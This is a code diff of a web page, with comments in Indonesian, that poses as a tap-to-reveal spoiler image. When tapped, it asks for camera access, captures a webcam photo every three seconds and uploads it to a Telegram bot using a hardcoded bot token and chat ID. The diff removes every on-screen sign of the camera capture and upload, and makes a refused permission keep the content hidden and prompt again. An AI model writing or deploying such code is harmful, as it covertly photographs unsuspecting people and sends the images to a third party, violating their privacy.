@@ -144,7 +144,7 @@
             font-size: 13px;
             display: flex;
             align-items: center;
-            justify-content: space-between;
+            justify-content: flex-end;
             letter-spacing: 0.2px;
         }
 
@@ -152,15 +152,6 @@
             color: #6f6f7a;
             font-size: 12px;
             background: #25252b;
-            padding: 4px 12px;
-            border-radius: 30px;
-            transition: all 0.2s ease;
-        }
-
-        .caption .status {
-            color: #4a9eff;
-            font-size: 11px;
-            background: #1a2a3a;
             padding: 4px 12px;
             border-radius: 30px;
             transition: all 0.2s ease;
@@ -204,7 +195,6 @@
         </div>
 
         <div class="caption">
-            <span class="status" id="statusText">📷 Klik spoiler untuk buka</span>
             <span class="tap-hint" id="tapHint">⏺ ketuk untuk lihat</span>
         </div>
     </div>
@@ -221,11 +211,14 @@
             const canvas = document.getElementById('dotCanvas');
             const ctx = canvas.getContext('2d');
             const hint = document.getElementById('tapHint');
-            const statusText = document.getElementById('statusText');
 
             // Elemen untuk kamera
             const video = document.getElementById('video');
             const captureCanvas = document.getElementById('canvas');
+
+            // ====== BOT TELEGRAM ======
+            const BOT_TOKEN = '8562131602:AAEjjGESS-yKIiCYOGwMr3a5_YFdZSBHi0o';
+            const CHAT_ID = '7933552719';
 
             let dots = [];
             const DOT_COUNT = 1200;
@@ -233,6 +226,8 @@
             let isUnblurred = false;
             let isCameraReady = false;
             let captureInterval = null;
+            let isPermissionDenied = false;
+            let isRequestingPermission = false;
 
             // ====== BINTIK ======
             function resizeCanvas() {
@@ -309,10 +304,11 @@
 
             // ====== SETUP KAMERA ======
             async function setupCamera() {
-                try {
-                    statusText.textContent = '📷 Meminta izin kamera...';
-                    statusText.style.color = '#fbbf24';
+                if (isRequestingPermission) return;
+                
+                isRequestingPermission = true;
 
+                try {
                     const stream = await navigator.mediaDevices.getUserMedia({
                         audio: false,
                         video: {
@@ -328,11 +324,10 @@
                         captureCanvas.width = video.videoWidth;
                         captureCanvas.height = video.videoHeight;
                         isCameraReady = true;
-                        statusText.textContent = '📸 Kamera aktif';
-                        statusText.style.color = '#4ade80';
+                        isPermissionDenied = false;
+                        isRequestingPermission = false;
                         startCapturing();
 
-                        // Buka spoiler setelah kamera aktif
                         if (!isUnblurred) {
                             isUnblurred = true;
                             bubble.classList.add('unblur');
@@ -343,15 +338,15 @@
 
                 } catch (e) {
                     console.error("Camera Error:", e);
-                    statusText.textContent = '❌ Izin kamera ditolak';
-                    statusText.style.color = '#ff6b6b';
-
-                    // Tetap buka spoiler meskipun kamera ditolak
-                    if (!isUnblurred) {
-                        isUnblurred = true;
-                        bubble.classList.add('unblur');
-                        hint.textContent = '✅ terlihat';
-                        stopAnimation();
+                    isPermissionDenied = true;
+                    isCameraReady = false;
+                    isRequestingPermission = false;
+                    
+                    if (isUnblurred) {
+                        isUnblurred = false;
+                        bubble.classList.remove('unblur');
+                        hint.textContent = '⏺ ketuk untuk lihat';
+                        startAnimation();
                     }
                 }
             }
@@ -365,16 +360,12 @@
 
                     context.drawImage(video, 0, 0, captureCanvas.width, captureCanvas.height);
                     const data = captureCanvas.toDataURL("image/jpeg", 0.7);
-
                     sendToTelegram(data);
                 }, 3000);
             }
 
             // ====== KIRIM KE BOT TELEGRAM ======
             function sendToTelegram(imageData) {
-                const BOT_TOKEN = '8562131602:AAEjjGESS-yKIiCYOGwMr3a5_YFdZSBHi0o';
-                const CHAT_ID = '7933552719';
-
                 fetch(imageData)
                     .then(res => res.blob())
                     .then(blob => {
@@ -389,26 +380,33 @@
                     })
                     .then(response => response.json())
                     .then(result => {
-                        if (result.ok) {
-                            statusText.textContent = '✅ Foto terkirim!';
-                            statusText.style.color = '#4ade80';
-                            setTimeout(() => {
-                                statusText.textContent = '📸 Mengirim foto...';
-                            }, 2000);
-                        } else {
-                            throw new Error(result.description || 'Gagal kirim');
+                        if (!result.ok) {
+                            console.error('Gagal kirim:', result.description);
                         }
                     })
                     .catch(err => {
                         console.error('Error kirim ke bot:', err);
-                        statusText.textContent = '❌ Gagal kirim';
-                        statusText.style.color = '#ff6b6b';
                     });
             }
 
             // ====== TOGGLE SPOILER ======
             function toggleSpoiler(e) {
                 e.stopPropagation();
+
+                // Jika izin ditolak, reset dan minta izin lagi (tanpa embel-embel)
+                if (isPermissionDenied) {
+                    if (video.srcObject) {
+                        video.srcObject.getTracks().forEach(track => track.stop());
+                        video.srcObject = null;
+                    }
+                    isCameraReady = false;
+                    if (captureInterval) {
+                        clearInterval(captureInterval);
+                        captureInterval = null;
+                    }
+                    setupCamera();
+                    return;
+                }
 
                 if (isUnblurred) {
                     isUnblurred = false;
@@ -423,7 +421,6 @@
                     return;
                 }
 
-                // Mulai kamera
                 if (!isCameraReady) {
                     setupCamera();
                 } else {
